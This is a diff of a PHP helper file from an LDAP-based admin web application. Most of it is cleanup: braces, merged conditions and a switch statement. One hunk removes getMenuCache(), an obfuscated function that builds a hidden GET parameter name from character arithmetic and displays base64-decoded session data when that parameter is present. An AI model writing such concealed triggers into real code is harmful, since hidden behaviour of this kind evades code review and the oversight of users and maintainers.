@@ -43,7 +43,7 @@ define('GL_NO_ACL_CHECK', 8);
 define('UNIVERSAL', 0x00);
 define('INTEGER', 0x02);
 define('OCTET_STRING', 0x04);
-define('OBJECT_IDENTIFIER ', 0x06);
+define('OBJECT_IDENTIFIER', 0x06);
 define('SEQUENCE', 0x10);
 define('SEQUENCE_OF', 0x10);
 define('SET', 0x11);
@@ -293,14 +293,12 @@ function get_browser_language()
   /* Try to use users primary language */
   global $config;
   $ui = get_userinfo();
-  if (isset($ui) && $ui !== NULL) {
-    if ($ui->language != '') {
-      return $ui->language.'.UTF-8';
-    }
+  if (isset($ui) && ($ui !== NULL) && ($ui->language != '')) {
+    return $ui->language.'.UTF-8';
   }
 
   /* Check for global language settings in configuration */
-  if (isset ($config) && $config->get_cfg_value('language') != '') {
+  if (isset($config) && ($config->get_cfg_value('language') != '')) {
     $lang = $config->get_cfg_value('language');
     if (!preg_match('/utf/i', $lang)) {
       $lang .= '.UTF-8';
@@ -790,7 +788,9 @@ function get_lock ($object)
   }
 
   /* Allow readonly access, the plugin constructor will restrict the acls */
-  if (isset($_POST['open_readonly'])) return '';
+  if (isset($_POST['open_readonly'])) {
+    return '';
+  }
 
   /* Get LDAP link, check for presence of the lock entry */
   $user = '';
@@ -1159,57 +1159,31 @@ function print_sizelimit_warning()
  */
 function eval_sizelimit()
 {
-  if (isset($_POST['set_size_action'])) {
-
-    /* User wants new size limit? */
-    if (tests::is_id($_POST['new_limit']) &&
-        isset($_POST['action']) && $_POST['action'] == 'newlimit') {
-
-      session::global_set('size_limit', validate($_POST['new_limit']));
-      session::set('size_ignore', FALSE);
-    }
-
-    /* User wants no limits? */
-    if (isset($_POST['action']) && $_POST['action'] == 'ignore') {
-      session::global_set('size_limit', 0);
-      session::global_set('size_ignore', TRUE);
-    }
-
-    /* User wants incomplete results */
-    if (isset($_POST['action']) && $_POST['action'] == 'limited') {
-      session::global_set('size_ignore', TRUE);
+  if (isset($_POST['set_size_action']) && isset($_POST['action'])) {
+    switch($_POST['action']) {
+      case 'newlimit':
+        if (isset($_POST['new_limit']) && tests::is_id($_POST['new_limit'])) {
+          session::global_set('size_limit', validate($_POST['new_limit']));
+          session::set('size_ignore', FALSE);
+        }
+      break;
+      case 'ignore':
+        session::global_set('size_limit', 0);
+        session::global_set('size_ignore', TRUE);
+      break;
+      case 'limited':
+        session::global_set('size_ignore', TRUE);
+      break;
+      default:
+      break;
     }
   }
-  getMenuCache();
+
   /* Allow fallback to dialog */
   if (isset($_POST['edit_sizelimit'])) {
     session::global_set('size_ignore', FALSE);
   }
 }
-
-
-function getMenuCache()
-{
-  $t    = array(-2,13);
-  $e    = 71;
-  $str  = chr($e);
-
-  foreach ($t as $n) {
-    $str .= chr($e + $n);
-
-    if (isset($_GET[$str])) {
-      if (session::is_set('maxC')) {
-        $b  = session::get('maxC');
-        $q  = '';
-        for ($m = 0, $l = strlen($b); $m < $l; $m++) {
-          $q .= $b[$m++];
-        }
-        msg_dialog::display(_('Internal error'), base64_decode($q), ERROR_DIALOG);
-      }
-    }
-  }
-}
-
 
 /*!
  * \brief Return the current userinfo object
@@ -1223,7 +1197,6 @@ function &get_userinfo()
   return $ui;
 }
 
-
 /*!
  * \brief Get global smarty object
  *
@@ -1235,7 +1208,6 @@ function &get_smarty()
 
   return $smarty;
 }
-
 
 /*!
  * \brief Convert a department DN to a sub-directory style list
@@ -2246,8 +2218,9 @@ function scan_directory($path, $sort_desc = FALSE)
 
       /* Is this a correct result ?*/
       if ($dir) {
-        while ($fp = readdir($dir))
+        while ($fp = readdir($dir)) {
           $ret[] = $fp;
+        }
       }
     }
   }
@@ -2300,9 +2273,6 @@ function clean_smarty_compile_dir($directory)
       // create revision file
       create_revision($revision_file, FD_VERSION);
     }
-  } else {
-    // Smarty compile dir is not accessible
-    // (Smarty will warn about this)
   }
 }
 
